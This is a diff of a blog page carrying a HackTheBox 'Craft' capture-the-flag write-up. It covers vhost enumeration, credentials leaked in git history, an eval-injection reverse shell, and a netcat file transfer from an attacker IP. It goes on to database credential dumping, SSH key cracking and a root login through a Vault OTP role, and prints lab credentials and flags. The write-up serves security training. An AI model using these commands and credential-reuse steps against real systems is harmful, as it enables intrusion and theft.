@@ -1,33 +1,4 @@
-<!DOCTYPE html>
-<html lang="en"><head>
-  <meta charset="utf-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-  <title>HackTheBox :: Craft</title><!-- Begin Jekyll SEO tag v2.7.1 -->
-<meta name="generator" content="Jekyll v4.2.0" />
-<meta property="og:title" content="HackTheBox :: Craft" />
-<meta property="og:locale" content="en_US" />
-<meta name="description" content="HackTheBox :: Craft" />
-<meta property="og:description" content="HackTheBox :: Craft" />
-<link rel="canonical" href="https://sradley.github.io/writeups/2020/12/25/htb-craft.html" />
-<meta property="og:url" content="https://sradley.github.io/writeups/2020/12/25/htb-craft.html" />
-<meta property="og:site_name" content="sradley" />
-<meta property="og:type" content="article" />
-<meta property="article:published_time" content="2020-12-25T00:00:00+08:00" />
-<meta name="twitter:card" content="summary" />
-<meta property="twitter:title" content="HackTheBox :: Craft" />
-<script type="application/ld+json">
-{"description":"HackTheBox :: Craft","mainEntityOfPage":{"@type":"WebPage","@id":"https://sradley.github.io/writeups/2020/12/25/htb-craft.html"},"url":"https://sradley.github.io/writeups/2020/12/25/htb-craft.html","@type":"BlogPosting","headline":"HackTheBox :: Craft","dateModified":"2020-12-25T00:00:00+08:00","datePublished":"2020-12-25T00:00:00+08:00","@context":"https://schema.org"}</script>
-<!-- End Jekyll SEO tag -->
-<link rel="stylesheet" type="text/css" href="/assets/main-dark.css"></head>
-<body>
-    <div class="container"><header>
-  <div class="menu">
-    <ul><li><a href="/">/</a></li><li><a href="/about/">/about</a></li><li><a href="/contact.html">/contact</a></li></ul>
-  </div>
-</header>
-<main>
-      <h1 id="hackthebox--craft">HackTheBox :: Craft</h1>
+I"�E<h1 id="hackthebox--craft">HackTheBox :: Craft</h1>
 
 <h2 id="initial-enumeration">Initial Enumeration</h2>
 <p>Let’s start our initial enumeration by performing a tcp port scan.</p>
@@ -66,11 +37,16 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 </code></pre></div></div>
 <p><br /></p>
 
-<p>Nothing particularly interesting here. An HTTPS server running on port 443, and a weird looking SSH server running on port 6022. Some research on the technologies behind the 6022 SSH server reveal some username enumeration vulnerabilities but nothing of note.</p>
+<p>Nothing particularly interesting here. An HTTPS server running on port 443, and a weird looking SSH
+server running on port 6022. Some research on the technologies behind the 6022 SSH server reveal
+some username enumeration vulnerabilities but nothing of note.</p>
 
-<p>Let’s fire up burpsuite and begin spidering the HTTPS server (let’s not forget to add “craft.htb” to our /etc/hosts file). We just want to get a feel for what is on the site.</p>
+<p>Let’s fire up burpsuite and begin spidering the HTTPS server (let’s not forget to add “craft.htb”
+to our /etc/hosts file). We just want to get a feel for what is on the site.</p>
 
-<p>The first thing that jumps out at me are links to two virtual hosts “api.craft.htb”, and “gogs.craft.htb”. Before jumping to those subdomains, we should probably do some vhost discovery. Let’s fire up gobuster and take a look.</p>
+<p>The first thing that jumps out at me are links to two virtual hosts “api.craft.htb”, and
+“gogs.craft.htb”. Before jumping to those subdomains, we should probably do some vhost discovery.
+Let’s fire up gobuster and take a look.</p>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gobuster vhost -u https://craft.htb --wordlist=SecLists/Discovery/Web-Content/common.txt -k
 ===============================================================
 Gobuster v3.0.1
@@ -92,28 +68,39 @@ Found: vault.craft.htb (Status: 404) [Size: 19]
 </code></pre></div></div>
 <p><br /></p>
 
-<p>Nice, so we found another vhost; “vault.craft.htb”. I think our next step should be to visit the “api.craft.htb” vhost, so let’s add this to our scope on burp and begin enumeration (note: don’t forget to add the vhosts to your /etc/hosts file).</p>
+<p>Nice, so we found another vhost; “vault.craft.htb”. I think our next step should be to visit the
+“api.craft.htb” vhost, so let’s add this to our scope on burp and begin enumeration (note: don’t
+forget to add the vhosts to your /etc/hosts file).</p>
 
-<p>Just a swagger api spec here, however this vhost does appear to contain all the api functionality for some application, could be a way in, but we’ll take a closer look later. Let’s have a look at the “gogs.craft.htb” vhost next.</p>
+<p>Just a swagger api spec here, however this vhost does appear to contain all the api functionality
+for some application, could be a way in, but we’ll take a closer look later. Let’s have a look at
+the “gogs.craft.htb” vhost next.</p>
 
-<p>This page is a lot more interesting. It’s a self-hosted git management service. When we visit the “explore” link, we discover what looks like the repository for the api we discovered earlier. Digging through the issues and commit history we find some credentials for the api in a test script that Dinesh uploaded, but later removed. Oh no, Dinesh.</p>
+<p>This page is a lot more interesting. It’s a self-hosted git management service. When we visit the
+“explore” link, we discover what looks like the repository for the api we discovered earlier.
+Digging through the issues and commit history we find some credentials for the api in a test script
+that Dinesh uploaded, but later removed. Oh no, Dinesh.</p>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>+response = requests.get('https://api.craft.htb/api/auth/login',  auth=('dinesh', '4aUh0A8PbVJxgd'), verify=False)
 </code></pre></div></div>
 
-<p>A quick <code class="language-plaintext highlighter-rouge">curl</code> request will confirm whether these credentials are still valid.</p>
+<p>A quick <code class="language-plaintext highlighter-rouge">curl</code> request will confirm whether
+these credentials are still valid.</p>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ curl https://api.craft.htb/api/auth/login -u dinesh:4aUh0A8PbVJxgd -k
 {"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTc3NzMzNTYwfQ.oLb0iw5P-JOaWpB3Jjq14VwIm8AJRmp3lQjcNY014lY"}
 </code></pre></div></div>
-<p><br /></p>
 
-<p>They’re still valid. Oh no, Dinesh. Why? I hope you haven’t re-used these credentials for the git management service. Let’s give them a try.</p>
+<p>They’re still valid. Oh no, Dinesh. Why? I hope you haven’t re-used these credentials for the
+git management service. Let’s give them a try.</p>
 
-<p>Sigh, they worked. I’m not sure what I expected. Let’s dig around some more now that we have access to Dinesh’s account.</p>
+<p>Sigh, they worked. I’m not sure what I expected. Let’s dig around some more now that we have access
+to Dinesh’s account.</p>
 
 <h2 id="initial-foothold">Initial Foothold</h2>
-<p>So a bit more digging around with Dinesh’s account didn’t reveal anything too important. However went through all the commits again we find a fix that Dinesh committed. Where he used an eval statement on user input. Oh, Dinesh.</p>
-
-<p>Unfortunately we need credentials to use it. But guess who leaked their credentials earlier? Thanks, Dinesh. Now we just need to figure out how we can get RCE. Let’s write a quick python script to leverage this and see if we can get a reverse shell.</p>
+<p>So a bit more digging around with Dinesh’s account didn’t reveal anything too important. However I
+went through all the commits again we find a fix that Dinesh committed. Where he used an eval
+statement on user input. Oh, Dinesh. Unfortunately we need credentials to use it. But guess who
+leaked their credentials earlier? Thanks, Dinesh. Now we just need to figure out how we can get
+RCE. Let’s write a quick python script to leverage this and see if we can get a reverse shell.</p>
 
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
 </span>
@@ -169,22 +156,27 @@ tests
 <p><br /></p>
 
 <h2 id="getting-user">Getting User</h2>
-<p>So, a few things to note: we’re logged in as root, but we can’t <code class="language-plaintext highlighter-rouge">cat /root/root.txt</code>. In conclusion, we are in a jail. Let’s do some digging around on the server for now, there seem to be a few interesting files.</p>
+<p>So, a few things to note: we’re logged in as root, but we can’t <code class="language-plaintext highlighter-rouge">cat /root/root.txt</code>. In
+conclusion, we are in a jail. Let’s do some digging around on the server for now, there seem to be
+a few interesting files.</p>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># whoami
 root
 </code></pre></div></div>
 <p><br /></p>
 
-<p>After a tiny bit of digging I ran into a file called <code class="language-plaintext highlighter-rouge">dbtest.py</code> (we ran into it earlier on the git repo too), and it seems to connect and query the database successfully. So what happens if we upload our own version that allows us to execute arbitrary queries? With a slight modification to our foothold script we can upload a file to the server.</p>
+<p>After a tiny bit of digging I ran into a file called <code class="language-plaintext highlighter-rouge">dbtest.py</code> (we ran into it earlier on the
+git repo too), and it seems to connect and query the database successfully. So what happens if we
+upload our own version that allows us to execute arbitrary queries? With a slight modification to
+our foothold script we can upload a file to the server.</p>
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PAYLOAD</span> <span class="o">=</span> <span class="s">'nc 10.10.xx.xx 4444 &gt; database.py'</span>
 </code></pre></div></div>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -lv -p 4444 &lt; database.py
 listening on [any] 4444 ...
 connect to [10.10.xx.xx] from craft.htb [10.10.10.110] 4220
 </code></pre></div></div>
-<p><br /></p>
 
-<p>Now let’s list the tables for the database, and see if we can read some of the more interesting sounding ones.</p>
+<p>Now let’s list the tables for the database, and see if we can read some of the more interesting
+sounding ones.</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -lv -p 4444
 listening on [any] 4444 ...
@@ -209,11 +201,15 @@ tests
  &gt;&gt; exit
 # exit
 </code></pre></div></div>
-<p><br /></p>
 
-<p>Awesome! More credentials. I wonder if any of these will work for the web server? Let’s try logging into the git management service with these new credentials.</p>
+<p>Awesome! More credentials. I wonder if any of these will work for the web server? Let’s try logging
+into the git management service with these new credentials.</p>
 
-<p>Gilfoyle! Of all the people I wouldn’t have expected to re-use credentials, it was you? Even Erlich didn’t re-use his for the git management service! Anyway, a bit of clicking around reveals a new private repository. And in this repository… an ssh key! More credentials, yikes, but at least this repo is private. Let’s try and use this new key, taking a look at the public key, it looks like he used the username “gilfoyle”.</p>
+<p>Gilfoyle! Of all the people I wouldn’t have expected to re-use credentials, it was you? Even
+Erlich didn’t re-use his for the git management service! Anyway, a bit of clicking around reveals a
+new private repository. And in this repository… an ssh key! More credentials, yikes, but at least
+this repo is private. Let’s try and use this new key, taking a look at the public key, it looks
+like he used the username “gilfoyle”.</p>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ssh -i ssh_gilfoyle gilfoyle@10.10.10.110
 
   .   *   ..  . *  *
@@ -232,7 +228,6 @@ tests
 
 Enter passphrase for key 'keys/ssh_gilfoyle':
 </code></pre></div></div>
-<p><br /></p>
 
 <p>Ah, a password. No matter. Let’s get cracking.</p>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ /usr/share/john/ssh2john.py ssh_gilfoyle &gt; ssh_gilfoyle.hash
@@ -246,9 +241,9 @@ Note: This format may emit false positives, so it will keep trying even after
 finding a possible candidate.
 Press 'q' or Ctrl-C to abort, almost any other key for status
 </code></pre></div></div>
-<p><br /></p>
 
-<p>Wow, nothing? I guess we’ll try the password he re-used for the git service, since the guys at Pied Piper seem to like re-using credentials.</p>
+<p>Wow, nothing? I guess we’ll try the password he re-used for the git service, since the guys at
+Pied Piper seem to like re-using credentials.</p>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ssh -i keys/ssh_gilfoyle gilfoyle@10.10.10.110
 
 
@@ -271,16 +266,17 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 Enter passphrase for key 'keys/ssh_gilfoyle':
 gilfoyle@craft:~$ 
 </code></pre></div></div>
-<p><br /></p>
 
-<p>And… we’re in. So much credential re-use. Guys, get a password manager, seriously. Let’s get the user flag now.</p>
+<p>And… we’re in. So much credential re-use. Guys, get a password manager, seriously. Let’s get the
+user flag now.</p>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gilfoyle@craft:~$ cat user.txt 
 bbf4b0cadfa3d4e6d0914c9cd5a612d4
 </code></pre></div></div>
-<p><br /></p>
 
 <h2 id="getting-root">Getting Root</h2>
-<p>To start, let’s take a look at Gilfoyle’s home directory. Interesting, a file called .vault-token  We’ve seen mentions of a “vault” around the git repo and we found a vhost with the name “vault”. Let’s take a look at the files we saw on the git repo.</p>
+<p>To start, let’s take a look at Gilfoyle’s home directory. Interesting, a file called .vault-token?
+We’ve seen mentions of a “vault” around the git repo and we found a vhost with the name “vault”.
+Let’s take a look at the files we saw on the git repo.</p>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vault secrets enable ssh
 
 vault write ssh/roles/root_otp \
@@ -288,23 +284,24 @@ vault write ssh/roles/root_otp \
     default_user=root \
     cidr_list=0.0.0.0/0
 </code></pre></div></div>
-<p><br /></p>
 
-<p>Interesting. Seems like there is some sort of SSH system here. I think it’s time to do some Googling and see what we can find out about this service.</p>
+<p>Interesting. Seems like there is some sort of SSH system here. I think it’s time to do some
+Googling and see what we can find out about this service.</p>
 
-<p>So after a bit of research it’s pretty obvious that this is set up as a OTP authentication system for SSH. You can read more about it <a href="https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html">here</a>. It seems that this one is set up for SSH’ing in as root, nice. Let’s give this a go.</p>
+<p>So after a bit of research it’s pretty obvious that this is set up as a OTP authentication system
+for SSH. You can read more about it
+<a href="https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html">here</a>. It seems that
+this one is set up for SSH’ing in as root, nice. Let’s give this a go.</p>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gilfoyle@craft:~$ vault ssh -role root_otp -mode otp root@10.10.10.110
 OTP for the session is: 91220244-1b96-5827-2533-9e05874b36b2
 Password:
 root@craft:~#
 </code></pre></div></div>
-<p><br /></p>
 
 <p>Perfect, it worked. Let’s get the root flag.</p>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@craft:~# cat root.txt 
 831d64ef54d92c1af795daae28a11591
 </code></pre></div></div>
-<p><br /></p>
 
 <h2 id="lessons-learned">Lessons Learned</h2>
 <ul>
@@ -312,11 +309,4 @@ root@craft:~#
   <li>Always leverage bad coding practices, like the use of “eval”, and “exec”, etc.</li>
   <li>People commonly commit credentials to git repos and later remove them, not realising they’re still in the commit history.</li>
 </ul>
-
-
-    </main><footer>
-  <a href="https://github.com/sradley">github.com/sradley</a>
-</footer>
-</div>
-  </body>
-</html>
+:ET
